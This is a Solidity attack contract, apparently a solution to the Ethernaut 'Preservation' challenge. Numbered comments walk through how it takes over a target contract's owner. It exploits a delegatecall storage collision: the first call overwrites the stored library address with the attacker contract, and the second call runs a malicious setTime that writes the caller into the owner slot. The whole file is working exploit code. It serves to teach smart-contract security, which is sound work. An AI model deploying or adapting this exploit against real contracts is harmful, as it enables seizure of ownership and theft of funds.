// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Preservation.sol";

contract PreservationAttack {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint storedTime;
    Preservation preservationContract;

    constructor(address _preservationContract) {
        preservationContract = Preservation(_preservationContract);
    }

    // 6. The malicious `setTime` function changes the state variable `owner` to be the address of attacker.
    function setTime(uint256 _owner) public {
        owner = address(uint160(_owner));
    }

    // 3. Function `attack` makes two calls to the `Preservation` contract.
    function attack() external {
        // 4. The first call executes a function `setFirstTime` with an address of `PreservationAttack` casted to `uint256`.
        preservationContract.setFirstTime(uint256(uint160(address(this))));
        // 5. Because the first call modified the address of `timeZone1LibraryAddress`, the second call will execute a malicious `setFirstTime` function on the `PreservationAttack` contract.
        preservationContract.setFirstTime(
            uint256(uint160(address(msg.sender)))
        );
    }
}
